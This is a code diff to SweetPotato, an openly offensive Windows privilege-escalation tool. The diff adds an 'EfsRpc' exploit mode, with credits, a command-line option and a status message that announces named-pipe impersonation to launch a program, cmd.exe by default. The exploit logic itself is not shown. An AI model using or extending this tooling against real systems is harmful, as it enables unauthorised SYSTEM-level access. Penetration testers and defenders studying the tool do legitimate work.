@@ -28,7 +28,8 @@ namespace SweetPotato {
                 "SweetPotato by @_EthicalChaos_\n" +
                  "  Orignal RottenPotato code and exploit by @foxglovesec\n" +
                  "  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n" + 
-                 "  PrintSpoofer discovery and original exploit by @itm4n"
+                 "  PrintSpoofer discovery and original exploit by @itm4n\n" +
+                 "  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam"
                 );
 
             OptionSet option_set = new OptionSet()
@@ -36,7 +37,7 @@ namespace SweetPotato {
                 .Add<ExecutionMethod>("m=|method=", "Auto,User,Thread (default Auto)", v => executionMethod = v)
                 .Add("p=|prog=", "Program to launch (default cmd.exe)", v => program = v)
                 .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
-                .Add<PotatoAPI.Mode>("e=|exploit=", "Exploit mode [DCOM|WinRM|PrintSpoofer(default)] ", v => mode = v)
+                .Add<PotatoAPI.Mode>("e=|exploit=", "Exploit mode [DCOM|WinRM|EfsRpc|PrintSpoofer(default)] ", v => mode = v)
                 .Add<ushort>("l=|listenPort=", "COM server listen port (default 6666)", v => port = v)
                 .Add("h|help", "Display this help", v => showHelp = v != null);
 
@@ -76,6 +77,8 @@ namespace SweetPotato {
 
                 if (mode == PotatoAPI.Mode.PrintSpoofer) {
                     Console.WriteLine($"[+] Attempting NP impersonation using method PrintSpoofer to launch {program}");
+                } else if (mode == PotatoAPI.Mode.EfsRpc) {
+                    Console.WriteLine($"[+] Attempting NP impersonation using method EfsRpc to launch {program}");
                 } else {
                     Console.WriteLine("[+] Attempting {0} with CLID {1} on port {2} using method {3} to launch {4}",
                     isBITSRequired ? "NTLM Auth" : "DCOM NTLM interception", clsId, isBITSRequired ? 5985 : port, executionMethod, program);
